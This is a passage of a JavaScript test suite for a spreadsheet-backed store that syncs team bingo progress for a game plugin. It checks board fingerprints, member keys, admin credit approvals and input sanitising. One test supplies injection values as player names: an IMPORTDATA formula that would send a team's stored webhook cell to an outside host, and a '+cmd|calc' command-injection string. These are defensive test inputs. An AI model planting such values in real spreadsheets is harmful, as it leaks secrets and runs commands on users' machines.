	ok(!!r.error, 'client without a board fingerprint is rejected');
	ok(s.sheet('Meta').data.length <= 1, 'and never writes the labels admins read');

	// Credit requests carry the fingerprint too: right board files, wrong board doesn't.
	r = s.post({ board: 'b_red', boardHash: goodHash, boardVersion: 2, members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: '', add: 5, complete: false, note: 'proof' } });
	ok(!r.error, 'request from the official board accepted');
	is(s.sheet('Requests').data.length, 2, 'request row filed');
	r = s.post({ board: 'b_red', boardHash: 'deadbeef', boardVersion: 2, members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: '', add: 5, complete: false, note: 'proof' } });
	ok(!!r.error, 'request from an edited board rejected');
	is(s.sheet('Requests').data.length, 2, 'and nothing filed');

	const s2 = newStore();
	r = s2.post({ board: 'b_red', boardHash: 'anything', members: {} });
	ok(!r.error, 'no pasted code means no enforcement');

	// The host pastes a revised code. A client still on the earlier paste is outdated
	// however it reports itself: same version number, or no version at all (hub
	// clients from before the field existed).
	const revised = '{"name":"Official","version":2,"tiles":[{"label":"Any weed","goals":[{"type":"XP","skill":"HERBLORE","amount":5}]}]}';
	s.sheet('Board code').getRange(2, 1).setValue(revised);
	const revisedHash = require('crypto').createHash('sha256').update(revised, 'utf8').digest('hex');
	r = s.post({ board: 'b_red', boardHash: goodHash, boardVersion: 2, members: {} });
	is(r.error, 'Board updated', 'earlier paste with the same version is outdated, not tampered');
	is(r.newerVersion, 2, 'it still names the version the host pasted');
	r = s.post({ board: 'b_red', boardHash: goodHash, members: {} });
	is(r.error, 'Board updated', 'a client sending no version is recognised by its hash');
	r = s.post({ board: 'b_red', boardHash: 'deadbeef', boardVersion: 2, members: {} });
	ok(r.error.indexOf('Wrong board') >= 0, 'an unknown hash is still tampering');
	r = s.post({ board: 'b_red', boardHash: revisedHash, boardVersion: 2, members: {} });
	ok(!r.error, 'the revised board syncs');
});

test('one team per board per member - relays cannot cross teams', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', rejoin: A, members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });

	// A blue teammate's stale cache relays Alice into blue: rejected outright.
	let r = s.post({ board: 'b_blue', rejoin: B,
		members: { [B]: member('Bob', {}), [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	ok(!(A in r.members), 'a relay can never create a member in another team');

	// Alice's own client arrives on blue: her row MOVES (evicted+tombstoned on red).
	r = s.post({ board: 'b_blue', rejoin: A, members: { [A]: member('Alice', { 0: tile(3000, [0]) }) } });
	ok(A in r.members, 'her own sync joins the new team');
	r = s.post({ board: 'b_red', members: { [B]: member('Bob', {}), [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	ok(!(A in r.members), 'the old team dropped her, and relays cannot bring her back');
	is(r.removed, [A], 'tombstoned on the old team');
});

test('team scores build cross-team standings on the shared board', () =>
{
	const s = newStore({ teams: [['Red', 'Red Team'], ['Blue', ''], ['Green', '']] });
	s.post({ board: 'b_red', members: {}, teamPoints: 30 });
	let r = s.post({ board: 'b_blue', members: {}, teamPoints: 45 });
	is(r.standings, [{ team: 'blue', points: 45 }, { team: 'red', points: 30 }], 'sorted best first');

	r = s.post({ board: 'b_red', members: {}, teamPoints: 60 });
	is(r.standings[0], { team: 'red', points: 60 }, 'score updates move the ranking');

	s.post({ board: 'other_green', members: {}, teamPoints: 99 });
	r = s.post({ board: 'b_red', members: {} });
	is(r.standings.length, 2, 'standings stay scoped to the same board');
});

test('read-only requests answer even while the write lock is held', () =>
{
	const s = newStore();
	s.context.LockService = { getScriptLock: () => ({ tryLock: () => false, releaseLock() {} }) };
	let r = s.post({ teamsOnly: true });
	is(r.teams.length, 2, 'team list served without the lock');
	r = s.post({ fetchBoard: true });
	ok(!!r.error, 'fetchBoard answered (no board pasted yet) rather than Busy');
	ok(r.error.indexOf('Busy') < 0, 'and its error is not the lock');
	r = s.post({ board: 'b_red', members: {} });
	ok(r.error && r.error.indexOf('Busy') === 0, 'a write still reports Busy');
});

test('a clock set far in the future cannot make progress unbeatable', () =>
{
	const s = newStore();
	// A broken (or malicious) clock pushes progress stamped ~year 2286.
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(9e15, [5]) }) } });
	// The owner later resets with an honest timestamp - it must still win.
	const r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(Date.now() + 1000, [0]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 0, 'honest reset beats the clamped future stamp');
});

test('the board view names each member and their last sync', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	const line = String(s.sheet('Board red').data[2][0]);
	ok(line.indexOf('Last sync') === 0, 'view carries a last-sync line');
	ok(line.indexOf('Alice') > 0, 'and it names the member');
});

test('an idle poll writes nothing', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, teamPoints: 5,
		members: { [A]: member('Alice', { 0: tile(1000, [3]) }) } });
	// Same state again: the poll that changes nothing must not touch any cell.
	let writes = 0;
	for (const name of ['Store', 'Scores', 'Meta'])
	{
		const sheet = s.sheet(name);
		const orig = sheet.getRange.bind(sheet);
		sheet.getRange = (...a) => { writes++; return orig(...a); };
	}
	const r = s.post({ board: 'b_red', meta: META, teamPoints: 5,
		members: { [A]: member('Alice', { 0: tile(1000, [3]) }) } });
	is(writes, 0, 'no cell ranges touched on an unchanged poll');
	is(r.members[A].tiles['0'].goals[0].n, 3, 'and the reply still carries the state');
});

test('a board update reaches the cached meta and the rendered view', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {} });
	const renamed = JSON.parse(JSON.stringify(META));
	renamed.name = 'Renamed board';
	s.post({ board: 'b_red', meta: renamed, members: {} });
	is(String(s.sheet('Board red').data[0][0]), 'Renamed board',
		'the forced render used the written-through meta, not a stale cache');
});

test('manual goals appear in the portal and keep goal indices aligned', () =>
{
	const s = newStore();
	// A mixed tile the way the plugin now sends it: manual first, tracked second.
	const MIXED = { name: 'M', size: 1, tiles: [{ label: 'Outfit OR XP', mode: 'ANY', goals: [
		{ label: 'Manual: outfit', target: 1, manual: true },
		{ label: 'Herblore XP', target: 100, manual: false }] }] };
	s.post({ board: 'b_red', meta: MIXED, members: {
		[A]: { name: 'Alice', tiles: { 0: { goals: [{}, { n: 60 }], manual: false, ts: 1000 } } } } });
	const html = vm.runInContext('portalPage()', s.context).getContent();
	ok(html.indexOf('Manual: outfit') >= 0, 'the manual goal renders in the portal');
	ok(html.indexOf('Herblore XP') >= 0, 'so does the tracked one');
	ok(html.indexOf('60') >= 0, 'and its progress landed on the right goal index');

	// A manual tick reads as 1/1 with the ticker named.
	s.post({ board: 'b_red', members: {
		[B]: { name: 'Bob', tiles: { 0: { goals: [{}, {}], manual: true, ts: 2000 } } } } });
	const ticked = vm.runInContext('portalPage()', s.context).getContent();
	ok(ticked.indexOf('ticked by Bob') >= 0, 'the tick and who made it are shown');
});

test('the store generation tells clients when the event was reset', () =>
{
	const s = newStore();
	let r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(1000, [5]) }) } });
	is(r.epoch, 1, 'a fresh store is generation 1');
	r = s.post({ board: 'b_red', members: {} });
	is(r.epoch, 1, 'ordinary syncs never move it');

	vm.runInContext('resetStoreData', s.context)();
	s.sheet('Teams').appendRow(['Red', 'Red Team']);
	r = s.post({ board: 'b_red', members: {} });
	is(r.epoch, 2, 'a reset bumps it, so clients drop what they cached');
});

test('Reset store data wipes every event tab but keeps Settings', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [5]) }) },
		request: { member: A, player: 'Alice', tile: 1, add: 5, note: 'x' } });
	s.sheet('Settings').data[1][1] = '45';
	s.post({ fetchBoard: true }); // creates the Board code tab
	s.sheet('Board code').appendRow(['{"tiles":[]}']);

	const resetStoreData = vm.runInContext('resetStoreData', s.context);
	resetStoreData();

	let r = s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(9000, [5]) }) } });
	ok(!!r.error, 'a stale client cannot rebuild the event before teams are re-listed');
	ok(!s.sheet('Board red'), 'and cannot recreate its board tab');
	is(r.teams, [], 'teams gone');

	s.sheet('Teams').appendRow(['Red', 'Red Team']);
	r = s.post({ board: 'b_red', members: {} });
	is(Object.keys(r.members).length, 0, 'store rows gone');
	is(r.pollSeconds, 45, 'settings survived the reset');
	is(s.sheet('Requests').data.length, 1, 'requests cleared to just the header');
	r = s.post({ fetchBoard: true });
	ok(!!r.error, 'board code cleared');
	ok(s.sheet('Store').hidden === true, 'recreated machine tabs are hidden again');
});

test('an unlisted team code never gets a Board tab', () =>
{
	const s = newStore();
	// A client still holding last event's team code syncs with a new board: rejected.
	let r = s.post({ board: 'b_oldteam', members: { [A]: member('Alice', { 0: tile(1000, [1]) }) } });
	ok(!!r.error, 'unlisted team is rejected');
	ok(!s.sheet('Board oldteam'), 'no board tab from the rejected sync');
	// Leaving that team sends a departure mark, which used to render (and create) its tab.
	r = s.post({ board: 'b_oldteam', members: {}, remove: [A] });
	ok(!s.sheet('Board oldteam'), 'no board tab from the departure mark either');
	// A listed team still renders on demand.
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [1]) }) } });
	s.post({ board: 'b_red', members: {}, remove: [A] });
	ok(!!s.sheet('Board red'), 'listed team keeps its board tab');
});

test('pasting a board code fills the portal for every team before anyone syncs', () =>
{
	const s = newStore();
	const code = JSON.stringify({ name: 'Paste first', id: 'Ev-2026', version: 3, size: 1,
		tiles: [{ label: 'Onyx', mode: 'ANY', goals: [
			{ type: 'DROP', items: ['Uncut onyx'], sources: ['Zulrah'], count: 2 },
			{ type: 'XP', skill: 'HITPOINTS', amount: 50000 }] }] });
	s.post({ fetchBoard: true });
	s.sheet('Board code').appendRow([code]);
	// Any request runs the reconcile, even one from a client on another board.
	s.post({ board: 'id_ev-2026_red', boardHash: 'deadbeef', members: {} });
	const metaRows = s.sheet('Meta').data.slice(1).map(r => String(r[0])).sort();
	is(metaRows, ['id_ev-2026_blue', 'id_ev-2026_red'], 'one Meta row per listed team');
	const meta = JSON.parse(s.sheet('Meta').data[1][2]);
	is(meta.name, 'Paste first', 'board name from the code');
	is(meta.tiles[0].mode, 'ANY', 'tile mode kept');
	is(meta.tiles[0].goals[0].label, 'Drops: Uncut onyx from Zulrah', 'goal label like the plugin');
	is(meta.tiles[0].goals[0].target, 2, 'count target');
	is(meta.tiles[0].goals[1].label, '50,000 Hitpoints XP', 'xp label');
	is(meta.tiles[0].goals[1].target, 50000, 'xp target');
	const page = vm.runInContext('doGet({ parameter: {} })', s.context).getContent();
	ok(page.indexOf('Paste first') >= 0, 'the portal shows the pasted board');

	// A revised paste replaces the rows; Refresh board view rebuilds from the code too.
	const revised = code.replace('Paste first', 'Revised');
	s.sheet('Board code').data[1][0] = revised;
	vm.runInContext('refreshAllViews', s.context)();
	is(JSON.parse(s.sheet('Meta').data[1][2]).name, 'Revised', 'refresh picks up the new paste');
});

test('goal labels from a board code match the plugin wording', () =>
{
	const s = newStore();
	const label = (goal) => vm.runInContext('goalShortLabel', s.context)(goal, String(goal.type).toUpperCase());
	is(label({ type: 'DROP', items: ['Ancient page*'], sources: ['Zulrah', 'Vorkath', 'Hydra'], distinct: true, loot: ['KILL'] }),
		'Distinct kill drops from 3 sources', 'a long description falls back to the short form');
	is(label({ type: 'DROP', items: ['Ancient page*'], sources: ['Zulrah'], distinct: true }),
		'Distinct drops: Ancient page from Zulrah', 'distinct drops with a source');
	is(label({ type: 'DROP', items: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R'], sources: ['Zulrah'] }),
		'Drops from Zulrah', 'long lists fall back to the short form');
	is(label({ type: 'DROP', itemIds: [6571] }), 'Drops: item 6571', 'id-only goal');
	is(label({ type: 'RAID_PURPLE', raids: ['TOB'] }), 'Raid purples (TOB)', 'raid purples');
	is(label({ type: 'RAID_PURPLE' }), 'Raid purples (COX, TOB, TOA)', 'all raids');
	is(label({ type: 'KC', npcs: ['Zulrah'] }), 'Kills: Zulrah', 'kill count');
	is(label({ type: 'PET' }), 'Any pet', 'any pet');
	is(label({ type: 'LAP', course: 'Seers' }), "Seers' Village course laps", 'laps use the course display name');
	is(label({ type: 'VALUE', amount: 1000000, sources: ['Zulrah'] }), 'Drop worth 1,000,000+ gp from Zulrah', 'loot value');
	is(label({ type: 'CHAT', pattern: 'Corrupted challenge duration: [0-6]:[0-5][0-9]' }),
		'Corrupted challenge duration', 'readable chat pattern');
	is(label({ type: 'MANUAL' }), 'Manual (tick off by hand)', 'manual');
	is(label({ type: 'XP', skill: 'HITPOINTS', amount: 5000, name: 'HP grind' }), 'HP grind', 'a set name wins');
});

test('approvals follow the request, not its row number', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 40, complete: false, note: 'a' } });
	const setRequestStatus = vm.runInContext('setRequestStatus', s.context);
	ok(setRequestStatus(2, 'Done'), 'Alice approved');
	// An admin deletes Alice's handled row; Bob's new request lands on row 2.
	s.sheet('Requests').deleteRow(2);
	s.post({ board: 'b_red', members: {}, request:
		{ member: B, player: 'Bob', tile: 1, goal: 1, add: 5, complete: false, note: 'b' } });
	is(String(s.sheet('Requests').data[1][2]), 'Bob', 'Bob now sits on row 2');
	ok(setRequestStatus(2, 'Done'), 'Bob approved');
	let r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:bob'].tiles['0'].goals[0].n, 5, 'Bob is credited, not swallowed by an old tag');
	ok(setRequestStatus(2, 'Rejected'), 'Bob rejected');
	r = s.post({ board: 'b_red', members: {} });
	ok(!('admin:bob' in r.members), 'Bob loses his credit');
	is(r.members['admin:alice'].tiles['0'].goals[0].n, 40, 'Alice keeps hers');
});

test('legacy request rows keep matching their old row-number tags', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 40, complete: false, note: 'a' } });
	// A row from before ids existed, approved under the old "request #2:" tag.
	s.sheet('Requests').data[1][11] = '';
	s.sheet('Adjustments').appendRow(['red', '1', '1', 'Alice', '40', '', 'request #2: a', 'approved request']);
	const setRequestStatus = vm.runInContext('setRequestStatus', s.context);
	ok(setRequestStatus(2, 'Done'), 'Done again');
	is(s.sheet('Adjustments').data.filter(r => String(r[6]).indexOf('request #2:') === 0).length, 1,
		'no second credit for a legacy approval');
	ok(setRequestStatus(2, 'Pending'), 'back to Pending');
	is(s.sheet('Adjustments').data.filter(r => String(r[6]).indexOf('request #2:') === 0).length, 0,
		'Pending withdraws the legacy approval too');
});

test('pasting Done over several Status cells applies every row', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 3, complete: false, note: 'a' } });
	s.post({ board: 'b_red', members: {}, request:
		{ member: B, player: 'Bob', tile: 1, goal: 1, add: 4, complete: false, note: 'b' } });
	const requests = s.sheet('Requests');
	requests.data[1][9] = 'Done';
	requests.data[2][9] = 'Done';
	// A paste over whole rows: the edited range spans columns 1 to 12.
	vm.runInContext('onEdit', s.context)({ range: requests.getRange(2, 1, 2, 12) });
	const r = s.post({ board: 'b_red', members: {} });
	is(r.members['admin:alice'].tiles['0'].goals[0].n, 3, 'first pasted row credited');
	is(r.members['admin:bob'].tiles['0'].goals[0].n, 4, 'second pasted row credited');
	// An edit that does not touch the Status column changes nothing.
	vm.runInContext('onEdit', s.context)({ range: requests.getRange(2, 8, 1, 1) });
	is(s.sheet('Adjustments').data.length, 3, 'no extra ledger rows');
});

test('a rate-limited announcement is retried, and player text never pings', () =>
{
	const s = newStore();
	s.sheet('Teams').data[1][2] = 'https://discord.com/api/webhooks/123/abc';
	s.post({ board: 'b_red', meta: META, members: {}, request:
		{ member: A, player: 'Alice', tile: 1, goal: 1, add: 40, complete: false, note: '@everyone look' } });
	s.urlFetchStatus.value = 429;
	ok(vm.runInContext('setRequestStatus', s.context)(2, 'Done'), 'approval applies');
	is(s.urlFetches.length, 1, 'one attempt, refused by Discord');
	is(JSON.parse(s.urlFetches[0].options.payload).allowed_mentions, { parse: [] }, 'mentions are off');
	s.urlFetchStatus.value = 204;
	s.post({ board: 'b_red', members: {} });
	is(s.urlFetches.length, 2, 'the refused message is retried on the next sync');
	s.post({ board: 'b_red', members: {} });
	is(s.urlFetches.length, 2, 'and sent only once');
});

test('the store completes tiles by the plugin rules', () =>
{
	const s = newStore();
	const meta = { name: 'Rules', size: 2, tiles: [
		{ label: 'Manual', mode: 'ALL', goals: [{ label: 'Manual', target: 1, manual: true }] },
		{ label: 'Mixed', mode: 'ALL', goals: [{ label: 'Kills', target: 2 }, { label: 'Manual', target: 1, manual: true }] },
		{ label: 'Either', mode: 'ANY', goals: [{ label: 'Manual', target: 1, manual: true }, { label: 'Kills', target: 2 }] },
		{ label: 'Distinct', mode: 'ALL', goals: [{ label: 'Pages', target: 3, distinct: true }] }] };
	s.post({ board: 'b_red', meta, members: { [A]: member('Alice', {
		1: tile(1000, [2]),
		3: { goals: [{ n: 0, matched: ['Page 1', 'Page 2'] }], manual: false, ts: 1000 } }) } });
	// Admin credit: a count on the manual goal, and one item on the distinct goal.
	s.sheet('Adjustments').appendRow(['red', '1', '1', 'Kaos', '1', '', '', '']);
	s.sheet('Adjustments').appendRow(['red', '4', '1', 'Kaos', '1', '', '', '']);
	const totals = vm.runInContext('tileTotals', s.context)('b_red', meta);
	is(totals.done[0], false, 'a count never completes a manual goal');
	is(totals.done[1], false, 'an ALL tile with a manual goal needs the tick');
	is(totals.done[2], false, 'an ANY tile ignores its manual goal until counted goals reach');
	is(totals.done[3], true, 'distinct names plus admin credit reach the target, like the plugin');
});

test('a client writes only its own row, and a member key locks that row to its owner', () =>
{
	const s = newStore();
	const K1 = 'a'.repeat(64);
	const K2 = 'b'.repeat(64);
	s.post({ board: 'b_red', meta: META, memberKey: K1, members: { [A]: member('Alice', { 0: tile(1000, [3]) }) } });
	ok(/^[0-9a-f]{32}$/.test(String(s.sheet('Store').data[1][5])), 'the row keeps a hash of the key');
	ok(String(s.sheet('Store').data[1][5]).indexOf('aaaa') < 0, 'never the key itself');

	// Bob's client relays a stale copy of Alice: ignored.
	let r = s.post({ board: 'b_red', rejoin: B, members: {
		[B]: member('Bob', { 0: tile(2000, [1]) }), [A]: member('Alice', { 0: tile(9000, []) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 3, 'a relayed copy cannot overwrite Alice');
	is(r.members[B].tiles['0'].goals[0].n, 1, 'Bob still writes his own row');

	// Someone posing as Alice: a different key, or none, is refused.
	r = s.post({ board: 'b_red', memberKey: K2, members: { [A]: member('Alice', { 0: tile(9000, []) }) } });
	is(r.error, 'Key mismatch - ask your host', 'the wrong key is told why it cannot write');
	r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(9000, []) }) } });
	is(r.error, 'Key mismatch - ask your host', 'so is a client with no key');
	r = s.post({ board: 'b_red', members: {} });
	is(r.members[A].tiles['0'].goals[0].n, 3, 'and nothing was written');
	s.post({ board: 'b_red', memberKey: K2, members: {}, remove: [A] });
	r = s.post({ board: 'b_red', members: {} });
	ok(A in r.members, 'nor make Alice leave the team');

	// The real Alice still can.
	r = s.post({ board: 'b_red', memberKey: K1, members: { [A]: member('Alice', { 0: tile(3000, [4]) }) } });
	is(r.members[A].tiles['0'].goals[0].n, 4, 'the owner writes as before');
});

test('sheet cells never receive formulas from player text', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {}, request:
		{ member: A, player: '=IMPORTDATA("https://x/"&Teams!C2)', tile: 1, add: 2, note: 'n' } });
	const player = String(s.sheet('Requests').data[1][2]);
	ok(player.charAt(0) !== '=', 'the request keeps no leading formula sign');
	vm.runInContext('setRequestStatus', s.context)(2, 'Done');
	ok(String(s.sheet('Adjustments').data[1][3]).charAt(0) !== '=', 'nor does the ledger copy');
	s.post({ board: 'b_red', members: { [B]: member('+cmd|calc', { 0: tile(1000, [1]) }) } });
	ok(String(s.sheet('Store').data.find(row => row[1] === B)[2]).charAt(0) !== '+',
		'stored names are cleaned too');
});

test('with a board code pasted, the board summary comes from the code, not the client', () =>
{
	const s = newStore();
	const code = JSON.stringify({ name: 'Official', id: 'ev', size: 1,
		tiles: [{ label: 'Real tile', goals: [{ type: 'KILL', npcs: ['Man'], count: 10 }] }] });
	s.post({ fetchBoard: true });
	s.sheet('Board code').appendRow([code]);
	const hash = require('crypto').createHash('sha256').update(code, 'utf8').digest('hex');
	const forged = { name: 'Fake', size: 1, tiles: [{ label: 'Easy', goals: [{ label: 'x', target: 1 }] }] };
	s.post({ board: 'id_ev_red', boardHash: hash, meta: forged, members: {} });
	const row = s.sheet('Meta').data.find(r => r[0] === 'id_ev_red');
	const meta = JSON.parse(row[2]);
	is(meta.name, 'Official', 'name from the code');
	is(meta.tiles[0].goals[0].target, 10, 'targets from the code');
});

test('an oversized request is refused before it is parsed', () =>
{
	const s = newStore();
	const r = s.post({ board: 'b_red', members: {}, junk: 'x'.repeat(250000) });
	is(r.error, 'Request too large', 'refused');
});

test('an admin wipe outranks any timestamp a client may still send', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [3]) }) } });
	vm.runInContext('resetStoreTileProgress', s.context)('red', 1);
	// A client clock running four minutes fast, still holding the pre-wipe numbers.
	const fast = Date.now() + 4 * 60 * 1000;
	const r = s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(fast, [3]) }) } });
	ok(!r.members[A].tiles['0'].goals.length, 'the wipe still stands');
	ok(r.members[A].tiles['0'].ts > fast, 'stamped past the fast clock');
});

test('re-pasting an earlier board code makes the newer clients the outdated ones', () =>
{
	const s = newStore();
	const sha = text => require('crypto').createHash('sha256').update(text, 'utf8').digest('hex');
	const a = '{"name":"A","id":"ev","version":1,"tiles":[{"label":"x"}]}';
	const b = '{"name":"B","id":"ev","version":1,"tiles":[{"label":"y"}]}';
	s.post({ fetchBoard: true });
	s.sheet('Board code').appendRow([a]);
	s.post({ board: 'id_ev_red', boardHash: sha(a), members: {} });
	s.sheet('Board code').data[1][0] = b;
	s.post({ board: 'id_ev_red', boardHash: sha(b), members: {} });
	s.sheet('Board code').data[1][0] = a; // the host goes back
	let r = s.post({ board: 'id_ev_red', boardHash: sha(b), members: {} });
	is(r.error, 'Board updated', 'clients on B are told to update, not accused');
	r = s.post({ board: 'id_ev_red', boardHash: sha(a), members: {} });
	ok(!r.error, 'clients on A sync again');
});

test('a board update wipe never touches a board whose id only starts the same', () =>
{
	const s = newStore();
	s.post({ board: 'id_spring_red', members: { [A]: member('Alice', { 0: tile(1000, [3]) }) } });
	s.post({ board: 'id_spring_2_red', members: { [B]: member('Bob', { 0: tile(1000, [5]) }) } });
	vm.runInContext('wipeTilesForBoardId', s.context)('spring', [0]);
	let r = s.post({ board: 'id_spring_2_red', members: {} });
	is(r.members[B].tiles['0'].goals[0].n, 5, 'board spring_2 keeps its progress');
	r = s.post({ board: 'id_spring_red', members: {} });
	ok(!r.members[A].tiles['0'].goals.length, 'board spring is wiped');
});

test('config tabs are cached between syncs, and a hand edit clears the cache', () =>
{
	const s = newStore({ configCache: true });
	let r = s.post({ board: 'b_green', members: { [A]: member('Alice', { 0: tile(1000, [1]) }) } });
	ok(!!r.error, 'green is not a listed team');
	s.sheet('Teams').appendRow(['Green', 'Green Team']);
	r = s.post({ board: 'b_green', members: { [A]: member('Alice', { 0: tile(1000, [1]) }) } });
	ok(!!r.error, 'still the cached team list until the tab is edited by hand');
	vm.runInContext('onEdit', s.context)({ range: s.sheet('Teams').getRange(4, 1, 1, 1) });
	r = s.post({ board: 'b_green', members: { [A]: member('Alice', { 0: tile(1000, [1]) }) } });
	ok(!r.error, 'the edit applies on the next sync');
});

test('a steady sync reads only the tabs that change', () =>
{
	const s = newStore({ configCache: true });
	s.post({ board: 'b_red', meta: META, members: { [A]: member('Alice', { 0: tile(1000, [1]) }) } });
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(2000, [2]) }) } });
	const before = FakeSheet.reads;
	s.post({ board: 'b_red', members: { [A]: member('Alice', { 0: tile(3000, [3]) }) } });
	const reads = FakeSheet.reads - before;
	// Store, Removed, Scores and Adjustments. Teams, the board code, Settings and Meta
	// come from the cache.
	ok(reads <= 4, 'at most four whole-tab reads per sync (was ' + reads + ')');
});

test('credit requests must name a real tile, goal and a positive amount', () =>
{
	const s = newStore();
	s.post({ board: 'b_red', meta: META, members: {} });
	const send = request => s.post({ board: 'b_red', members: {},
		request: Object.assign({ member: A, player: 'Alice', tile: 1, note: 'n' }, request) });
	send({ goal: 'abc', add: 2 });
	send({ goal: 5, add: 2 });
	send({ tile: 9, add: 2 });
	send({ add: -3 });
	send({ add: 'Infinity' });
	ok(!s.sheet('Requests') || s.sheet('Requests').data.length <= 1, 'none of the bad requests were filed');
	send({ goal: 1, add: 2 });
	is(s.sheet('Requests').data.length, 2, 'a valid request still is');
});

test('a departure notice succeeds even for a team the host has since removed', () =>
{
	const s = newStore();
	s.post({ board: 'b_blue', members: { [A]: member('Alice', { 0: tile(1000, [1]) }) } });
	s.sheet('Teams').data.splice(2, 1); // the host removes Blue
	const r = s.post({ board: 'b_blue', members: {}, remove: [A] });
	ok(!r.error, 'no error, so the client stops retrying');
	is(r.left, [A], 'and the departure was recorded');
});

// ---------------------------------------------------------------- report

if (failures.length)
{
	console.error('\nSTORE TESTS FAILED (' + failures.length + '):');
	for (const failure of failures)
	{
		console.error('  âœ— ' + failure);
	}
	process.exitCode = 1;
}
else
{
	console.log('Store tests: all scenarios passed.');
}

